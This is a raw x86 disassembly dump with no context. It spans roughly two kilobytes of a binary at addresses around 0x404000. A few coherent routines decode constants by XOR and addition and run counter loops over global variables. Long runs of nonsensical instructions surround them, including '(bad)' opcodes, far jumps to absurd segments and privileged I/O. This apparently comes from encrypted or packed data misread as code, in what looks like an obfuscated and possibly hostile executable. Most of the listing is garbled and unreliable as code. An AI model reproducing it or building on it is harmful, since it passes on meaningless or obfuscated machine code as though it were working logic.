  4043c2:	cmp    al,0x12
  4043c4:	adc    eax,0xb5bfc4e
  4043c9:	(bad)  
  4043ca:	call   0x59922526
  4043cf:	inc    ebp
  4043d0:	mov    ah,0x7f
  4043d2:	jae    0x40436b
  4043d4:	jne    0x4043e0
  4043d6:	enter  0x78a1,0xa7
  4043da:	imul   ebx,DWORD PTR [ebp+ebx*4+0xf],0xffffff85
  4043df:	mov    edx,0x5ffffffd
  4043e4:	pop    ebx
  4043e5:	mov    eax,DWORD PTR [ebp-0x8]
  4043e8:	mov    edx,DWORD PTR [ebp+0x10]
  4043eb:	xor    eax,ecx
  4043ed:	add    eax,esi
  4043ef:	mov    DWORD PTR [edx],eax
  4043f1:	mov    eax,DWORD PTR [ebp-0x8]
  4043f4:	xor    eax,ecx
  4043f6:	add    eax,esi
  4043f8:	mov    DWORD PTR [ebp+0x8],eax
  4043fb:	mov    eax,DWORD PTR [ebp+0x8]
  4043fe:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404402:	mov    dl,BYTE PTR [ebp-0x1]
  404405:	cmp    al,dl
  404407:	je     0x40444a
  40440d:	mov    eax,DWORD PTR [ebp+0x8]
  404410:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404414:	mov    edx,DWORD PTR [ebp+0xc]
  404417:	cmp    al,BYTE PTR [edx]
  404419:	jne    0x40467a
  40441f:	mov    eax,DWORD PTR [ebp-0x8]
  404422:	mov    edx,DWORD PTR [ebp+0xc]
  404425:	movsx  edx,BYTE PTR [edx]
  404428:	xor    eax,ecx
  40442a:	add    eax,esi
  40442c:	cmp    edx,eax
  40442e:	je     0x404464
  404434:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40443b:	lea    eax,[ebp-0x18]
  40443e:	mov    DWORD PTR [ebp-0x14],eax
  404441:	mov    eax,DWORD PTR [ebp-0x14]
  404444:	add    DWORD PTR [eax],0x705fa8f
  40444a:	mov    eax,DWORD PTR [ebp-0x10]
  40444d:	mov    edx,DWORD PTR [ebp+0x8]
  404450:	xor    eax,ecx
  404452:	lea    eax,[eax+edx*1+0x32729e]
  404459:	mov    DWORD PTR [ebp+0x8],eax
  40445c:	inc    DWORD PTR [ebp+0xc]
  40445f:	jmp    0x4043fb
  404464:	mov    eax,DWORD PTR [ebp-0x10]
  404467:	jmp    0x40456c
  40446c:	sbb    esi,DWORD PTR [edi+0x22]
  40446f:	sbb    BYTE PTR [edx],ah
  404471:	cmp    eax,0x7b87773d
  404476:	les    ecx,FWORD PTR ds:0x5613fe3a
  40447c:	mov    dh,0x1c
  40447e:	jl     0x4044fc
  404480:	push   esp
  404481:	jl     0x4044ff
  404483:	jl     0x404463
  404485:	clc    
  404486:	rcl    ecx,0xc3
  404489:	push   cs
  40448a:	inc    ebp
  40448b:	fisttp WORD PTR [ecx+0x256da88e]
  404491:	push   es
  404492:	cli    
  404493:	loopne 0x4044ff
  404495:	pop    ebp
  404496:	xorps  xmm4,XMMWORD PTR [ebx-0x7c]
  40449a:	sbb    cl,BYTE PTR [edx+0x3e]
  40449d:	ins    BYTE PTR es:[edi],dx
  40449e:	cwde   
  40449f:	inc    esp
  4044a0:	mov    ah,BYTE PTR [ebx+esi*1-0x27d99fed]
  4044a7:	mov    esp,0x887529d8
  4044ac:	nop
  4044ad:	push   ecx
  4044ae:	(bad)  
  4044af:	div    BYTE PTR [edi-0x16]
  4044b2:	inc    esp
  4044b3:	ins    BYTE PTR es:[edi],dx
  4044b4:	pop    edi
  4044b5:	gs inc edi
  4044b7:	les    edi,FWORD PTR [ecx+0x4476d8ca]
  4044bd:	mov    eax,ds:0x91cce6d6
  4044c2:	mov    eax,0xd73fe502
  4044c7:	and    edx,DWORD PTR [edi-0x3ede1396]
  4044cd:	retf   0x2ba
  4044d0:	xchg   ebp,eax
  4044d1:	adc    eax,0xa4cdd0e
  4044d6:	rol    BYTE PTR [eax],0x60
  4044d9:	cli    
  4044da:	shl    BYTE PTR [edi],cl
  4044dc:	pop    es
  4044dd:	jge    0x40454e
  4044df:	xchg   esp,eax
  4044e0:	pop    edi
  4044e1:	ds push ebx
  4044e3:	mov    ch,0xc6
  4044e5:	push   edx
  4044e6:	adc    DWORD PTR [eax-0x2],esp
  4044e9:	aam    0x9c
  4044eb:	dec    BYTE PTR [ecx+0x42f054f]
  4044f1:	mov    bl,0x91
  4044f3:	gs gs js 0x404533
  4044f7:	jecxz  0x4044d2
  4044f9:	test   BYTE PTR [esi-0x1407d2e3],dh
  4044ff:	out    dx,eax
  404500:	inc    eax
  404501:	cmp    DWORD PTR [ecx],ebx
  404503:	cwde   
  404504:	jmp    0x6544:0x20d58999
  40450b:	ja     0x404576
  40450d:	or     BYTE PTR [eax+0x42],0xa7
  404511:	cmp    BYTE PTR ds:0x1c2760b4,ch
  404517:	pop    esp
  404518:	mov    ebx,0xccd274b1
  40451d:	dec    edi
  40451e:	push   edx
  40451f:	dec    eax
  404520:	loope  0x404509
  404522:	cdq    
  404523:	jmp    0x404508
  404525:	xchg   esp,eax
  404526:	je     0x4044cc
  404528:	not    BYTE PTR [esi-0x5fffb283]
  40452e:	and    DWORD PTR [ecx],edi
  404530:	or     BYTE PTR [ebx+0x1387908c],0xec
  404537:	sub    DWORD PTR ds:0x97ff66d8,edx
  40453d:	mov    ebx,0xa105bc83
  404542:	sti    
  404543:	adc    DWORD PTR [eax+0x3904922d],0x580e870b
  40454d:	xchg   ebx,eax
  40454e:	pop    esi
  40454f:	push   esp
  404550:	mov    eax,0xd5b0c61
  404555:	dec    ecx
  404556:	es int 0x3f
  404559:	xchg   ecx,edi
  40455b:	jp     0x404560
  40455d:	iret   
  40455e:	les    edi,FWORD PTR [esi]
  404560:	mov    ch,0x8a
  404562:	cmp    BYTE PTR ds:0xb048428e,bh
  404568:	jp     0x404536
  40456a:	adc    BYTE PTR [eax+0x33],dh
  40456d:	ror    DWORD PTR [ebx+0xe9104d],0x1
  404574:	add    BYTE PTR [eax],al
  404576:	imul   eax,DWORD PTR ds:0x7d79fdb1,0x7b
  40457d:	test   DWORD PTR [esi],esp
  40457f:	xchg   ecx,eax
  404580:	retf   
  404581:	(bad)  [ebx-0x51b5ae75]
  404587:	pop    ds
  404588:	jl     0x404606
  40458a:	push   esp
  40458b:	jl     0x404609
  40458d:	jl     0x4045a1
  40458f:	pushf  
  404590:	aad    0x16
  404592:	jne    0x40454c
  404594:	xor    BYTE PTR [ebx],dh
  404596:	xor    al,0x82
  404598:	imul   esi,DWORD PTR [esi],0x20b369de
  40459e:	cs dec edi
  4045a0:	out    dx,al
  4045a1:	fild   WORD PTR [ebp+0x3e5ebc9a]
  4045a7:	int3   
  4045a8:	dec    edx
  4045a9:	and    al,0xe5
  4045ab:	mov    bh,0x8b
  4045ad:	jge    0x404532
  4045af:	(bad)  
  4045b1:	ret    0x29b5
  4045b4:	ret    0x952c
  4045b7:	ss jnp 0x4045ae
  4045ba:	pop    ebp
  4045bb:	adc    al,0x3f
  4045bd:	pushf  
  4045be:	mov    dh,0xd8
  4045c0:	scas   eax,DWORD PTR es:[edi]
  4045c1:	or     eax,DWORD PTR [ebx-0x66d4297f]
  4045c7:	fstp   TBYTE PTR [ebp-0x16]
  4045ca:	add    DWORD PTR [ebx],ecx
  4045cc:	sub    bl,BYTE PTR [eax+0x3176a440]
  4045d2:	mov    al,0x35
  4045d4:	push   ds
  4045d5:	iret   
  4045d6:	popa   
  4045d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045d8:	pop    ss
  4045d9:	pop    es
  4045da:	into   
  4045db:	(bad)
  4045de:	push   esp
  4045df:	adc    BYTE PTR [eax],0xcb
  4045e2:	lods   al,BYTE PTR ds:[esi]
  4045e3:	or     edi,eax
  4045e5:	leave  
  4045e6:	sbb    DWORD PTR [ebx+0x51],ecx
  4045e9:	mov    esp,0x76d42c0e
  4045ee:	add    DWORD PTR [edx+0xc1f01d0],ecx
  4045f4:	mov    dh,0x6
  4045f6:	mov    dl,0x1d
  4045f8:	inc    DWORD PTR [edi+0x48002f4]
  4045fe:	inc    ebp
  4045ff:	xchg   ebp,eax
  404600:	minps  xmm5,xmm6
  404603:	gs mov dh,0x45
  404606:	xchg   esp,eax
  404607:	inc    edi
  404608:	lahf   
  404609:	cmp    eax,0x1f95ef2e
  40460e:	sahf   
  40460f:	add    cl,BYTE PTR [edi-0x7b]
  404612:	das    
  404613:	test   al,0x40
  404615:	push   edx
  404616:	or     al,0xf6
  404618:	jl     0x404637
  40461a:	cmp    DWORD PTR [eax+0x44],eax
  40461d:	int3   
  40461e:	xor    al,0x57
  404620:	loopne 0x404681
  404622:	pop    ecx
  404623:	loop   0x4046a2
  404625:	pop    esi
  404626:	push   ss
  404627:	push   0xffffffd1
  404629:	pushf  
  40462a:	lods   eax,DWORD PTR ds:[esi]
  40462b:	dec    esp
  40462c:	mov    eax,0x69eae063
  404631:	scas   al,BYTE PTR es:[edi]
  404632:	outs   dx,DWORD PTR ds:[esi]
  404633:	xchg   BYTE PTR [ebx],dh
  404635:	and    eax,0xe59d7cbb
  40463a:	adc    DWORD PTR [esi+0x39bffc1a],ebx
  404640:	mov    dh,0xfc
  404642:	xor    BYTE PTR [edx],ah
  404644:	sub    esi,DWORD PTR [ecx+0x11]
  404647:	stos   DWORD PTR es:[edi],eax
  404648:	inc    esp
  404649:	vmwrite ecx,DWORD PTR [edx]
  40464c:	add    ebp,DWORD PTR [ecx-0xe]
  40464f:	rcr    BYTE PTR [ebp+0x331d7f77],1
  404655:	dec    ebp
  404656:	cmp    bl,BYTE PTR ds:0x94d249bf
  40465c:	dec    ebx
  40465d:	int3   
  40465e:	mov    edi,0x6834e3de
  404663:	pop    esi
  404664:	jbe    0x4046a9
  404666:	cmp    esi,DWORD PTR [ecx+0x196250aa]
  40466c:	scas   eax,DWORD PTR es:[edi]
  40466d:	rcr    DWORD PTR ds:0xb94e69e9,0xfe
  404674:	or     dh,BYTE PTR [ebx+eax*1+0x5e0189c6]
  40467b:	leave  
  40467c:	ret    0xc
  40467f:	push   ebp
  404680:	mov    ebp,esp
  404682:	push   ecx
  404683:	adc    edx,0x1579
  404689:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  404690:	sbb    DWORD PTR ds:0x4292a5,0xe46
  40469a:	mov    eax,DWORD PTR [ebp-0x4]
  40469d:	xor    edx,edx
  40469f:	add    edx,DWORD PTR ds:0x42c8ba
  4046a5:	xor    ecx,ecx
  4046a7:	add    ecx,DWORD PTR ds:0x42c8ce
  4046ad:	sub    edx,ecx
  4046af:	xor    edx,DWORD PTR [edx+ecx*1]
  4046b2:	mov    edx,DWORD PTR [ebp+0x10]
  4046b5:	xor    DWORD PTR ds:0x427cf7,0x3e4e
  4046bf:	mov    ecx,0x7510857
  4046c4:	sbb    DWORD PTR ds:0x427cff,0x4292c5
  4046ce:	xor    eax,ecx
  4046d0:	add    DWORD PTR ds:0x4275ac,0x4292c1
  4046da:	add    eax,0x32729e
  4046df:	mov    DWORD PTR [edx],eax
  4046e1:	adc    DWORD PTR ds:0x427cff,0xab1
  4046eb:	mov    eax,DWORD PTR [ebp+0xc]
  4046ee:	mov    DWORD PTR ds:0x4292c5,0x1c
  4046f8:	cmp    DWORD PTR ds:0x4292c5,0x0
  4046ff:	je     0x4048d6
  404705:	cmp    DWORD PTR ds:0x4292c5,0xd
  40470c:	jne    0x404718
  404712:	call   DWORD PTR ds:0x4279d3
  404718:	cmp    DWORD PTR ds:0x4292c5,0xe
  40471f:	jne    0x404734
  404725:	xor    edx,edx
  404727:	xor    edx,DWORD PTR ds:0x4292c5
  40472d:	dec    edx
  40472e:	mov    DWORD PTR ds:0x4292c5,edx
  404734:	xor    edx,edx
  404736:	xor    edx,DWORD PTR ds:0x4292c5
  40473c:	dec    edx
  40473d:	mov    DWORD PTR ds:0x4292c5,edx
  404743:	jmp    0x4046f8
  404748:	and    DWORD PTR ds:0x427cf7,0x0
  404752:	jmp    0x404766
  404757:	xor    edx,edx
  404759:	or     edx,DWORD PTR ds:0x427cf7
  40475f:	inc    edx
  404760:	mov    DWORD PTR ds:0x427cf7,edx
  404766:	cmp    DWORD PTR ds:0x427cf7,0x1c
  40476d:	jae    0x4048d6
  404773:	cmp    DWORD PTR ds:0x427cf7,0x21
  40477a:	jne    0x404791
  404780:	push   DWORD PTR [ebp-0xc]
  404783:	push   DWORD PTR [ebp-0x28]
  404786:	push   0x3a03
  40478b:	call   DWORD PTR ds:0x4278f3
  404791:	jmp    0x404757
  404796:	jmp    0x4048d6
  40479b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40479c:	mov    eax,0x5df986f9
  4047a1:	gs mov ebx,0x53054722
  4047a7:	leave  
  4047a8:	cmp    BYTE PTR [ebp+0x7c1e8686],al
  4047ae:	jl     0x4047c1
  4047b0:	jg     0x40482e
  4047b2:	jl     0x4047ac
  4047b4:	push   edx
  4047b5:	rol    al,1
  4047b7:	sbb    eax,0x86752f89
  4047bc:	stos   BYTE PTR es:[edi],al
  4047bd:	sbb    DWORD PTR [esi+0x27],eax
  4047c0:	repnz mov al,0x8a
  4047c3:	mov    eax,ebx
  4047c5:	loope  0x4047da
  4047c7:	ror    DWORD PTR [ecx-0x7e],cl
  4047ca:	adc    DWORD PTR [edi],esp
  4047cc:	ror    bl,cl
  4047ce:	inc    ebp
  4047cf:	mov    cl,0xe0
  4047d1:	mov    cl,BYTE PTR [ebx+0x6e9bd43]
  4047d7:	pop    ds
  4047d8:	mov    ch,0x22
  4047da:	outs   dx,BYTE PTR ds:[esi]
  4047db:	or     al,0x40
  4047dd:	and    al,0xe4
  4047df:	push   ecx
  4047e0:	push   esi
  4047e1:	call   0xb21e70cc
  4047e6:	cs mov esi,0x7cbc4854
  4047ec:	dec    ecx
  4047ed:	mov    ah,0xc6
  4047ef:	retf   0xf0fe
  4047f2:	jno    0x404851
  4047f4:	addr16 jns 0x404876
  4047f7:	cld    
  4047f8:	call   0x35b84adf
  4047fd:	repnz scas al,BYTE PTR es:[edi]
  4047ff:	sbb    eax,esp
  404801:	int    0x1f
  404803:	xor    ecx,DWORD PTR [esi-0x42892fc9]
  404809:	xlat   BYTE PTR ds:[ebx]
  40480a:	aam    0x74
  40480c:	test   BYTE PTR ds:0x57c278c6,0xdb
  404813:	inc    edi
  404814:	fist   DWORD PTR [eax]
  404816:	push   cs
  404817:	out    0x39,eax
  404819:	aaa    
  40481a:	icebp  
  40481b:	push   edi
  40481c:	sbb    ah,BYTE PTR [eax+esi*8-0x24]
  404820:	mul    ah
  404822:	cdq    
  404823:	and    al,bh
  404825:	es aad 0xce
  404828:	in     al,0xa7
  40482a:	jl     0x4047d1
  40482c:	jb     0x40482e
  40482e:	pop    es
  40482f:	(bad)  
  404830:	rol    bl,cl
  404832:	mov    ebx,0xd945e6de
  404837:	pop    esp
  404838:	enter  0xe792,0x4d
  40483c:	or     eax,0x2d95cf31
  404841:	xchg   DWORD PTR [ebp+edx*8-0x27c54367],edx
  404848:	xor    DWORD PTR [ebp+0x2d],0x3b284f05
  40484f:	pop    edi
  404850:	mov    esp,0x5741dd5f
  404855:	cli    
  404856:	cmp    DWORD PTR ds:0x6bf62938,esi
  40485c:	mov    edx,0x7a075f6b
  404861:	bound  ebp,QWORD PTR [ebp-0x32]
  404864:	stos   BYTE PTR es:[edi],al
  404865:	shl    BYTE PTR [ecx-0x4],1
  404868:	rcr    DWORD PTR [ebp-0x73cf0532],cl
  40486e:	bound  eax,QWORD PTR [eax+0x4c9b638f]
  404874:	aam    0x93
  404876:	sahf   
  404877:	enter  0x6d0a,0x30
  40487b:	test   al,0x59
  40487d:	pop    ds
  40487e:	inc    ecx
  40487f:	mov    cl,0x9f
  404881:	push   esp
  404882:	in     eax,0x8d
  404884:	sbb    eax,esi
  404886:	into   
  404887:	dec    ebx
  404888:	cmc    
  404889:	mov    ebp,0x2c8f451e
  40488e:	hlt    
  40488f:	xlat   BYTE PTR ds:[ebx]
  404890:	push   ebx
  404891:	jno    0x40485c
  404893:	cmp    al,0x10
  404895:	fnsave [edx]
  404897:	xchg   edx,eax
  404898:	outs   dx,DWORD PTR ds:[esi]
  404899:	test   DWORD PTR [edi+0x5e2cdbd4],ecx
  40489f:	mov    esp,0x261d1942
  4048a4:	ja     0x404914
  4048a6:	cli    
  4048a7:	div    DWORD PTR [ebx]
  4048a9:	and    BYTE PTR [ebp+0x44],0xbf
  4048ad:	loopne 0x4048f9
  4048af:	or     DWORD PTR [edx+0x2944f8af],0x73f0edef
  4048b9:	cs jg  0x4048a0
  4048bc:	ror    DWORD PTR [ebx*4+0x7a513c54],0x18
  4048c4:	lahf   
  4048c5:	or     al,BYTE PTR [eax]
  4048c7:	push   ds
  4048c8:	cwde   
  4048c9:	mov    ch,0xde
  4048cb:	scas   eax,DWORD PTR es:[edi]
  4048cc:	jb     0x404886
  4048ce:	mov    esp,0xa48c15fc
  4048d3:	and    ah,BYTE PTR [esi+0x56c133f6]
  4048d9:	mov    esi,DWORD PTR [ebp+0x10]
  4048dc:	mov    edx,0x32729e
  4048e1:	add    eax,edx
  4048e3:	mov    DWORD PTR [esi+0x4],eax
  4048e6:	mov    eax,DWORD PTR [ebp+0x14]
  4048e9:	mov    esi,DWORD PTR [ebp+0x10]
  4048ec:	mov    DWORD PTR [esi+0x8],eax
  4048ef:	mov    eax,DWORD PTR [ebp+0x18]
  4048f2:	mov    esi,DWORD PTR [ebp+0x10]
  4048f5:	mov    DWORD PTR [esi+0xc],eax
  4048f8:	mov    eax,DWORD PTR [ebp+0x1c]
  4048fb:	mov    esi,DWORD PTR [ebp+0x10]
  4048fe:	jmp    0x404a3e
  404903:	shl    DWORD PTR [ebx+0x7],0xc
  404907:	mov    ebp,0x4065d978
  40490c:	mov    eax,ds:0x610ee8b5
  404911:	or     al,0xce
  404913:	mov    ebx,0x117c7c11
  404918:	jg     0x404996
  40491a:	jl     0x40492f
  40491c:	shl    bl,1
  40491e:	imul   ecx,esi,0x37
  404921:	cmp    bh,ch
  404923:	add    ebp,0xffffff98
  404926:	inc    ebx
  404927:	pop    esi
  404928:	jge    0x40499b
  40492a:	cmp    DWORD PTR [esi],edi
  40492c:	or     BYTE PTR [esi],cl
  40492e:	and    eax,0xd8f3fa6e
  404933:	push   ds
  404934:	sti    
  404935:	pop    esp
  404936:	pop    esp
  404937:	in     eax,dx
  404938:	jnp    0x40495d
  40493a:	cmp    dl,BYTE PTR [bp+di+0x688]
  40493f:	xor    eax,edi
  404941:	lahf   
  404942:	inc    esi
  404943:	mov    DWORD PTR [ebx+edi*8+0x2902608],esp
  40494a:	frstor [ecx+ebx*8-0x28]
  40494e:	jp     0x40493a
  404950:	scas   eax,DWORD PTR es:[edi]
  404951:	jb     0x40498c
  404953:	jno    0x40491d
  404955:	fwait
  404956:	mov    WORD PTR [esp+ebx*4-0x210e452f],fs
  40495d:	mov    esp,0x4098daa
  404962:	popa   
  404963:	inc    edx
  404964:	pop    eax
  404965:	iret   
  404966:	(bad)  
  404967:	(bad)  
  404968:	pop    esi
  404969:	imul   ebp,DWORD PTR [edx],0xab88977b
  40496f:	jns    0x4049cd
  404971:	sar    DWORD PTR [edx+0x26c24557],0xe2
  404978:	mov    DWORD PTR [eax-0x5da8212],esp
  40497e:	fnstcw WORD PTR [eax+0x6]
  404981:	popa   
  404982:	ret    
  404983:	sbb    ch,BYTE PTR [esp+ecx*8]
  404986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404987:	pushf  
  404988:	mov    ebx,0xaec6b9f1
  40498d:	mov    dh,0x5a
  40498f:	sub    eax,0x1e85117
  404994:	mov    dl,0xbe
  404996:	push   edx
  404997:	cmp    edx,edi
  404999:	cmp    al,0x13
  40499b:	in     eax,0x30
  40499d:	and    al,BYTE PTR [ebx-0x5f]
  4049a0:	sbb    eax,0xa236234b
  4049a5:	ins    DWORD PTR es:[edi],dx
  4049a6:	mov    ecx,0xdaaae529
  4049ab:	inc    ebp
  4049ac:	dec    esi
  4049ad:	fucomp st(7)
  4049af:	mov    al,0x6c
  4049b1:	xor    DWORD PTR [edi],0xd87e9ebb
  4049b7:	call   0xc01b:0xd752ad57
  4049be:	xor    esp,eax
  4049c0:	clc    
  4049c1:	rcl    BYTE PTR [ebx+edi*2],0xfb
  4049c5:	mov    eax,0x5594a1c3
  4049ca:	lahf   
  4049cb:	xchg   edx,eax
  4049cc:	fwait
  4049cd:	test   al,0x69
  4049cf:	mov    ch,0x59
  4049d1:	in     eax,dx
  4049d2:	cmp    al,0x7
  4049d4:	cld    
  4049d5:	retf   0x3cf0
  4049d8:	pop    ecx
  4049d9:	arpl   WORD PTR [ebp-0x65159f68],bx
  4049df:	mov    esi,0xc5280a78
  4049e4:	jne    0x404a0c
  4049e6:	xor    dh,cl
  4049e8:	mov    bl,0x2e
  4049ea:	js     0x404a0d
  4049ec:	fabs   
  4049ee:	or     DWORD PTR [edx+0x11fd0a98],ebx
  4049f4:	add    eax,0x34da8977
  4049f9:	adc    eax,0xe3e70b87
  4049fe:	mov    dh,0xcd
  404a00:	pop    es
  404a01:	dec    ebp
  404a02:	mov    edi,0xd410360e
  404a07:	ja     0x4049d1
  404a09:	leave  
  404a0a:	ds retf 
  404a0c:	inc    eax
  404a0d:	lock xor ebx,esi
  404a10:	cmp    al,0xbf
  404a12:	jge    0x4049de
  404a14:	in     al,0x8e
  404a16:	xchg   ebx,eax
  404a17:	or     eax,0x33702d08
  404a1c:	push   edx
  404a1d:	lods   al,BYTE PTR ds:[esi]
  404a1e:	ja     0x404a83
  404a20:	xor    eax,0xe60f23de
  404a25:	inc    ebx
  404a26:	aam    0x32
  404a28:	(bad)  
  404a29:	imul   ebx,DWORD PTR [edx+eiz*1+0x2a],0xffffff85
  404a2e:	outs   dx,DWORD PTR ds:[esi]
  404a2f:	jns    0x404a12
  404a31:	imul   edi,esp,0xa85ecc79
  404a37:	sub    BYTE PTR [ecx+0x4e],dh
  404a3a:	cmp    eax,0x8920314b
  404a3f:	inc    esi
  404a40:	adc    BYTE PTR [ebx+0x8458bc0],cl
  404a46:	xor    eax,ecx
  404a48:	add    eax,edx
  404a4a:	pop    esi
  404a4b:	leave  
  404a4c:	ret    0x18
  404a4f:	push   ebp
  404a50:	mov    ebp,esp
  404a52:	mov    eax,DWORD PTR [ebp+0xc]
  404a55:	xor    edx,edx
  404a57:	mov    ecx,0x7264fcad
  404a5c:	div    ecx
  404a5e:	jmp    0x404b9e
  404a63:	outs   dx,BYTE PTR ds:[esi]
  404a64:	stc    
  404a65:	sti    
  404a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a67:	jnp    0x404a23
  404a69:	gs stc 
  404a6b:	dec    esi
  404a6c:	xchg   DWORD PTR [ebx-0x3ea6d8f3],esp
  404a72:	icebp  
  404a73:	pop    esp
  404a74:	adc    BYTE PTR [esp+edi*2+0x11],bh
  404a78:	jg     0x404af6
  404a7a:	jl     0x404aa5
  404a7c:	jae    0x404a2f
  404a7e:	xor    eax,DWORD PTR [esi]
  404a80:	xor    al,0xd
  404a82:	repz jle 0x404ac0
  404a85:	fisub  DWORD PTR [eax-0x4b643360]
  404a8b:	push   0xffffffde
  404a8d:	pop    edi
  404a8e:	pop    ecx
  404a8f:	pop    eax
  404a90:	popa   
  404a91:	outs   dx,DWORD PTR ds:[esi]
  404a92:	dec    BYTE PTR [eax]
  404a94:	aaa    
  404a95:	nop
  404a96:	pop    eax
  404a97:	cwde   
  404a98:	loop   0x404a3a
  404a9a:	xor    BYTE PTR [eax],bl
  404a9c:	leave  
  404a9d:	(bad)  
  404a9e:	mov    esp,0x61ecbd29
  404aa3:	outs   dx,DWORD PTR ds:[esi]
  404aa4:	cmp    esp,edx
  404aa6:	fdiv   QWORD PTR [edi+ebx*8+0x4901f95b]
  404aad:	enter  0x5af5,0xd5
  404ab1:	sbb    DWORD PTR [edi+0x20],eax
  404ab4:	test   DWORD PTR [eax+0x68],0x6eae1c45
  404abb:	loope  0x404aea
  404abd:	push   edx
  404abe:	xchg   ebx,eax
  404abf:	and    BYTE PTR [ebx+eiz*8],0x77
  404ac3:	sbb    bl,BYTE PTR [ecx]
  404ac5:	dec    ebx
  404ac6:	enter  0x2a64,0xc4
  404aca:	sbb    BYTE PTR [ebp-0x65],dl
  404acd:	stos   BYTE PTR es:[edi],al
  404ace:	fstp   DWORD PTR [ebx+eiz*1]
  404ad1:	xchg   ebp,eax
  404ad2:	inc    ecx
  404ad3:	out    dx,eax
  404ad4:	mov    ebp,0x174d6e40
  404ad9:	dec    edx
  404ada:	pop    edx
  404adb:	fsubr  QWORD PTR [ebx+0x6c]
  404ade:	pusha  
  404adf:	int    0x73
  404ae1:	xchg   edx,eax
  404ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ae3:	inc    eax
  404ae4:	je     0x404ac6
  404ae6:	pop    ss
  404ae7:	mov    DWORD PTR [ecx],ebx
  404ae9:	cdq    
  404aea:	jnp    0x404ac7
  404aec:	fwait
  404aed:	cld    
  404aee:	adc    BYTE PTR [eax],ch
  404af0:	mov    bh,0xe8
  404af2:	cli    
  404af3:	cli    
  404af4:	fstp   TBYTE PTR [ecx]
  404af6:	enter  0x5425,0x67
  404afa:	mov    ch,BYTE PTR [edi]
  404afc:	in     al,dx
  404afd:	in     al,0x4f
  404aff:	loope  0x404b5d
  404b01:	sbb    esp,DWORD PTR [ebx-0x280ea249]
  404b07:	rcr    dh,1
  404b09:	mov    esp,ss
  404b0b:	mov    cl,0xce
  404b0d:	addr16 test eax,0x581aea49
  404b13:	ja     0x404b03
  404b15:	outs   dx,DWORD PTR ds:[esi]
  404b16:	push   cs
  404b17:	enter  0xf65b,0x9e
  404b1b:	into   
  404b1c:	(bad)  
  404b1e:	jb     0x404b5a
  404b20:	lods   eax,DWORD PTR ds:[esi]
  404b21:	int3   
  404b22:	jbe    0x404b34
  404b24:	or     ecx,DWORD PTR [ecx-0x27]
  404b27:	in     eax,0xfd
  404b29:	push   ds
  404b2a:	mov    ecx,0x26c93b4f
  404b2f:	sbb    BYTE PTR [edx],bh
  404b31:	mov    DWORD PTR [ebx+edi*4],ecx
  404b34:	or     eax,0x7247f438
  404b39:	push   ecx
  404b3a:	push   edi
  404b3b:	addr16 jmp 0x8f8f:0x9c36db2c
  404b43:	repnz pop DWORD PTR [ebp+0x53]
  404b47:	sbb    eax,0x875915c1
  404b4c:	loope  0x404bb6
  404b4e:	rcr    DWORD PTR [ecx+0x58],0x1c
  404b52:	sbb    DWORD PTR ds:0x869c376,edx
  404b58:	pop    edi
  404b59:	and    dl,BYTE PTR [eax+0x26cdfde0]
  404b5f:	test   BYTE PTR [edx],0x25
  404b62:	data16 cli 
  404b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b65:	jmp    DWORD PTR [eax+0x1d]
  404b68:	add    esp,DWORD PTR [ebx]
  404b6a:	jae    0x404b91
  404b6c:	jns    0x404b2d
  404b6e:	ss xchg edi,eax
  404b70:	inc    ebx
  404b71:	and    BYTE PTR [esi+0x27],ch
  404b74:	fst    QWORD PTR [ebx+0x76]
  404b77:	bound  edx,QWORD PTR [ebx-0x5e39e142]
  404b7d:	daa    
  404b7e:	jae    0x404b48
  404b80:	xchg   esp,esi
  404b82:	cmp    bh,0x39
  404b85:	je     0x404b9f
  404b87:	or     al,0x3e
  404b89:	scas   eax,DWORD PTR es:[edi]
  404b8a:	js     0x404bfa
  404b8c:	jb     0x404c0a
  404b8e:	adc    DWORD PTR [ecx],ebp
  404b90:	jg     0x404b51
  404b92:	inc    ebp
  404b93:	dec    ecx
  404b94:	lods   eax,DWORD PTR ds:[esi]
  404b95:	aam    0xf0
  404b97:	aam    0xef
  404b99:	imul   ebx,DWORD PTR [ecx],0x8ba528a4
  404b9f:	dec    ebp
  404ba0:	adc    BYTE PTR [ebx],ah
  404ba2:	enter  0xc981,0x8f
  404ba6:	sbb    eax,0x3be98116
  404bab:	add    DWORD PTR [eax],eax
  404bad:	add    ah,ch
  404baf:	xchg   ebx,eax
  404bb0:	imul   eax,esp,0x7b
  404bb3:	les    esp,FWORD PTR [ebx-0x55]
  404bb6:	jmp    0xec2ccde5
  404bbb:	pop    eax
  404bbc:	xchg   ebx,eax
  404bbd:	int    0x71
  404bbf:	adc    bh,BYTE PTR [esp+edi*2+0x11]
  404bc3:	jg     0x404c41
  404bc5:	jl     0x404bbd
  404bc7:	mov    bh,0x6
  404bc9:	clc    
  404bca:	sub    DWORD PTR ds:0xea070926,edi
  404bd0:	push   esi
  404bd1:	jecxz  0x404be3
  404bd3:	stos   DWORD PTR es:[edi],eax
  404bd4:	arpl   WORD PTR [ecx+0x47],dx
  404bd7:	add    BYTE PTR [eax+0x17888715],0xd5
  404bde:	jmp    0xdf45:0xd93edbd6
  404be5:	in     al,0xd6
  404be7:	mov    al,ds:0x816c076d
  404bec:	(bad)  
  404bed:	cmp    DWORD PTR [ebp-0x76],esp
  404bf0:	pop    ebp
  404bf1:	mov    ch,0x20
  404bf3:	xchg   edi,eax
  404bf4:	add    BYTE PTR [edx+ecx*8+0x7aa6135b],ch
  404bfb:	rcr    BYTE PTR [esi+ebx*8-0x16],cl
  404bff:	xlat   BYTE PTR ds:[ebx]
  404c00:	pop    edx
  404c01:	test   ecx,0x25e8c516
  404c07:	out    dx,al
  404c08:	jae    0x404b9e
  404c0a:	in     eax,dx
  404c0b:	jb     0x404c61
  404c0d:	mov    esp,0xe7d16b3f
  404c12:	pop    esi
  404c13:	sub    dl,ch
  404c15:	dec    edi
  404c16:	inc    edi
  404c17:	out    dx,al
  404c18:	int    0x64
  404c1a:	nop
  404c1b:	lahf   
  404c1c:	bound  eax,QWORD PTR [edx+0x12]
  404c1f:	pop    edi
